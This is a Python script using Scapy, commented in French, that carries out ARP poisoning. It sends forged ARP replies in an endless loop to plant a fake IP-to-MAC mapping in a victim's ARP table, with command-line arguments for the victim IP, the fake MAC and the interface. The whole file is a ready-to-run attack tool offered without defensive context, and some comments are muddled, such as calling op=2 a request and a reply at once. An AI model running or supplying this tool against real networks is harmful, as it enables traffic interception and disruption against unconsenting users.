from scapy.all import ARP, send
import argparse

def arp_poison(victim_ip, fake_mac, interface):
    """
    Injecte une fausse association IP ↔ MAC dans la table ARP de la victime.
    """
    print(f"Lancement de l'attaque ARP poisoning : {victim_ip} -> {fake_mac} sur {interface}")

    # Construction du paquet ARP
    arp_packet = ARP(
        op=2,  # Requête ARP Reply
        pdst=victim_ip,  # IP de la victime
        hwdst="ff:ff:ff:ff:ff:ff",  # Adresse MAC de la victime (diffusion)
        psrc=victim_ip,  # IP de la victime (spoofée)
        hwsrc=fake_mac  # Fausse adresse MAC
    )

    # Envoi continu pour maintenir la fausse entrée dans la table ARP
    try:
        while True:
            send(arp_packet, iface=interface, verbose=0)
            print(f"Paquet ARP envoyé : {victim_ip} -> {fake_mac}")
    except KeyboardInterrupt:
        print("\nAttaque interrompue par l'utilisateur.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Script d'ARP poisoning avec Scapy.")
    parser.add_argument("victim_ip", help="Adresse IP de la victime.")
    parser.add_argument("fake_mac", help="Fausse adresse MAC à injecter.")
    parser.add_argument("interface", help="Interface réseau à utiliser.")
    args = parser.parse_args()

    arp_poison(args.victim_ip, args.fake_mac, args.interface)
